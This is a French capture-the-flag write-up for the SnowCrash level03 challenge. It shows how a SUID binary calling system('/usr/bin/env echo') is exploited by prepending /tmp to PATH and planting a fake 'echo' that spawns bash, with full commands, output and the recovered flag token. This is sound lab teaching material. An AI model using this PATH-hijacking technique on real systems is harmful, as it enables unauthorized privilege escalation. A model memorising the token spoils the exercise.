# LEVEL 03

### Reconnaissance

En se connectant au level03, on tombe sur un binaire qui possède des droits SUID:

```
$ level03@SnowCrash:~$ file level03 
level03: setuid setgid ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.24, BuildID[sha1]=0x3bee584f790153856e826e38544b9e80ac184b7b, not stripped
$ level03@SnowCrash:~$ ls -la level03 
-rwsr-sr-x 1 flag03 level03 8627 Mar  5  2016 level03
```
### Exploitation

Quand on le lance, la sortie nous donne "Exploit me".

On regarde les strings du binaire:
```
$ strings level03
[...]
/usr/bin/env echo Exploit me
[...]
```

Et avec un débugeur, on peux voir qu'il y a un appel a system avec en argument:
```
ESP: 0xffffcf70 --> 0x80485e0 ("/usr/bin/env echo Exploit me")

0x80484fe <main+90>:	call   0x80483b0 <system@plt>
```

Pour l'exploitation, on va modifier le PATH de facon a ce que notre commande echo soit exécuté et pas celle du system:

```
level03@SnowCrash:~$ echo $PATH
/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games
level03@SnowCrash:~$ PATH=/tmp:$PATH
level03@SnowCrash:~$ echo $PATH
/tmp:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games
level03@SnowCrash:~$ export PATH
```
Ensuite on va creer notre propre commande echo:

```
level03@SnowCrash:~$ echo "/bin/bash" > /tmp/echo
level03@SnowCrash:~$ chmod +x /tmp/echo
level03@SnowCrash:~$ ./level03 
bash: /home/user/level03/.bashrc: Permission denied
flag03@SnowCrash:~$ getflag
Check flag.Here is your token : qi0maab88jeaj46qoumi7maus
flag03@SnowCrash:~$ exit
```

